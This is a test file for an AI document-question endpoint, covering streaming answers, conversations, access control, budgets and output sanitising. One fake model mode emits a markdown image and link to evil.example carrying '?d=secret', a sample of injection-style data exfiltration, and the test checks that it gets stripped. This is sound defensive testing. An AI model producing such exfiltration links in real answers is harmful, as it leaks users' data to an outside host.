import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { checkAskBudget, NOT_FOUND_ANSWER } from '../src/ai/answer.js';
import { createFakeChatModel, ChatUnavailableError, type ChatModel } from '../src/ai/chat-model.js';
import {
  createTestApp,
  devLogin,
  connectDemoAndWait,
  parseSse,
  type TestContext,
} from './helpers.js';

/** A fake model whose behaviour each test can switch, so one app (and one demo sync) serves all. */
function switchableModel() {
  const state = { mode: 'normal' as 'normal' | 'fail' | 'inject', calls: 0 };
  const normal = createFakeChatModel();
  const model: ChatModel = {
    model: 'fake-chat',
    async *stream(request, signal) {
      state.calls++;
      if (state.mode === 'fail') throw new ChatUnavailableError('busy');
      if (state.mode === 'inject') {
        yield {
          type: 'text',
          text: 'Done ![x](https://evil.example/?d=secret) see [here](https://evil.example/a) [1][42].',
        };
        yield { type: 'done', model: 'fake-chat', promptTokens: 1, completionTokens: 1 };
        return;
      }
      yield* normal.stream(request, signal);
    },
  };
  return { model, state };
}

describe('AI answers (/ask)', () => {
  let ctx: TestContext;
  let token: string;
  let workspaceId: string;
  const chat = switchableModel();

  beforeAll(async () => {
    ctx = await createTestApp({}, { chat: { chat: chat.model, rewriter: createFakeChatModel() } });
    token = (await devLogin(ctx.app, 'ama@example.com')).accessToken;
    ({ workspaceId } = await connectDemoAndWait(ctx.app, token));
  }, 180_000);
  afterAll(() => ctx.close());

  const as = (t: string) => ({ authorization: `Bearer ${t}` });
  const ask = async (question: string, conversationId?: string, t = token) => {
    const res = await ctx.app.inject({
      method: 'POST',
      url: `/v1/workspaces/${workspaceId}/ask`,
      headers: as(t),
      payload: { question, ...(conversationId && { conversationId }) },
    });
    return { res, events: res.statusCode === 200 ? parseSse(res.body) : [] };
  };
  const tokensOf = (events: { event: string; data: unknown }[]) =>
    events
      .filter((e) => e.event === 'token')
      .map((e) => (e.data as { t: string }).t)
      .join('');
  const eventData = <T>(events: { event: string; data: unknown }[], name: string) =>
    events.find((e) => e.event === name)?.data as T;

  it('streams meta → tokens → citations → done, and saves the conversation', async () => {
    chat.state.mode = 'normal';
    const { res, events } = await ask('What is the Project Alpha budget?');
    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toContain('text/event-stream');
    expect(events[0]!.event).toBe('meta');
    expect(events.at(-1)!.event).toBe('done');
    expect(events.map((e) => e.event)).toContain('citations');

    expect(tokensOf(events)).toMatch(/\[1\]$/);
    const citations = eventData<{ n: number; title: string }[]>(events, 'citations');
    expect(citations).toHaveLength(1);
    expect(citations[0]!.n).toBe(1);

    const { conversationId } = eventData<{ conversationId: string }>(events, 'meta');
    const conv = await ctx.app.inject({
      method: 'GET',
      url: `/v1/workspaces/${workspaceId}/conversations/${conversationId}`,
      headers: as(token),
    });
    expect(conv.json().messages.map((m: { role: string }) => m.role)).toEqual([
      'user',
      'assistant',
    ]);
    expect(conv.json().messages[1].citations).toHaveLength(1);
  });

  it('answers follow-ups in the same conversation', async () => {
    chat.state.mode = 'normal';
    const first = await ask('When is the Alpha delivery?');
    const { conversationId } = eventData<{ conversationId: string }>(first.events, 'meta');
    const second = await ask('and what about the budget?', conversationId);
    expect(eventData<{ conversationId: string }>(second.events, 'meta').conversationId).toBe(
      conversationId,
    );
    const list = await ctx.app.inject({
      method: 'GET',
      url: `/v1/workspaces/${workspaceId}/conversations`,
      headers: as(token),
    });
    expect(list.json().data[0].id).toBe(conversationId);
  });

  it('never uses documents the user may not see', async () => {
    chat.state.mode = 'normal';
    for (const q of [
      'What are the Series A fundraising plans?',
      'compensation review increase pool',
    ]) {
      const { events } = await ask(q);
      const titles = eventData<{ title: string }[]>(events, 'citations').map((c) => c.title);
      expect(titles).not.toContain('Board update – February 2026');
      expect(titles).not.toContain('Compensation review');
      expect(tokensOf(events)).not.toMatch(/Series A|6% total increase/);
    }
  });

  it("says it couldn't find anything (without calling the model) when there's nothing to search", async () => {
    // Meaning search always returns the nearest chunks, so with any data indexed the model gets
    // sources and must say it couldn't find the answer itself. With nothing indexed (a new
    // workspace), the model isn't called at all.
    chat.state.mode = 'normal';
    const newcomer = (await devLogin(ctx.app, 'newcomer@example.com')).accessToken;
    const me = await ctx.app.inject({ method: 'GET', url: '/v1/me', headers: as(newcomer) });
    const before = chat.state.calls;
    const res = await ctx.app.inject({
      method: 'POST',
      url: `/v1/workspaces/${me.json().workspaces[0].id}/ask`,
      headers: as(newcomer),
      payload: { question: 'When is the Alpha delivery?' },
    });
    const events = parseSse(res.body);
    expect(tokensOf(events)).toBe(NOT_FOUND_ANSWER);
    expect(eventData<unknown[]>(events, 'citations')).toEqual([]);
    expect(chat.state.calls).toBe(before);
  });

  it('reports an error event when the AI model is unavailable', async () => {
    chat.state.mode = 'fail';
    const { events } = await ask('When is the Alpha delivery?');
    const error = eventData<{ code: string }>(events, 'error');
    expect(error.code).toBe('LLM_UNAVAILABLE');
    expect(events.at(-1)!.event).toBe('done');
  });

  it('strips injected images, foreign links and made-up citations (fix S1)', async () => {
    chat.state.mode = 'inject';
    const { events } = await ask('Project Alpha budget');
    const { conversationId } = eventData<{ conversationId: string }>(events, 'meta');
    expect(eventData<{ n: number }[]>(events, 'citations').map((c) => c.n)).toEqual([1]);
    const conv = await ctx.app.inject({
      method: 'GET',
      url: `/v1/workspaces/${workspaceId}/conversations/${conversationId}`,
      headers: as(token),
    });
    const saved = conv.json().messages[1].content as string;
    expect(saved).not.toContain('evil.example');
    expect(saved).not.toContain('[42]');
    expect(saved).toContain('see here [1].');
  });

  it("keeps other people out of a user's conversations and feedback", async () => {
    chat.state.mode = 'normal';
    const { events } = await ask('Pro plan price');
    const { conversationId, messageId } = eventData<{ conversationId: string; messageId: string }>(
      events,
      'meta',
    );
    const ok = await ctx.app.inject({
      method: 'POST',
      url: `/v1/messages/${messageId}/feedback`,
      headers: as(token),
      payload: { rating: 1, comment: 'useful' },
    });
    expect(ok.statusCode).toBe(204);

    const stranger = (await devLogin(ctx.app, 'stranger@example.com')).accessToken;
    const read = await ctx.app.inject({
      method: 'GET',
      url: `/v1/workspaces/${workspaceId}/conversations/${conversationId}`,
      headers: as(stranger),
    });
    expect(read.statusCode).toBe(404);
    const fb = await ctx.app.inject({
      method: 'POST',
      url: `/v1/messages/${messageId}/feedback`,
      headers: as(stranger),
      payload: { rating: -1 },
    });
    expect(fb.statusCode).toBe(404);
  });

  it('enforces the daily question budget', async () => {
    const me = await ctx.app.inject({ method: 'GET', url: '/v1/me', headers: as(token) });
    await expect(
      checkAskBudget(ctx.database.db, workspaceId, me.json().user.id, 1),
    ).rejects.toMatchObject({ code: 'BUDGET_EXCEEDED' });
    await expect(
      checkAskBudget(ctx.database.db, workspaceId, me.json().user.id, 1000),
    ).resolves.toBeUndefined();
  });

  it('validates the question', async () => {
    const { res } = await ask('   ');
    expect(res.statusCode).toBe(400);
  });
});
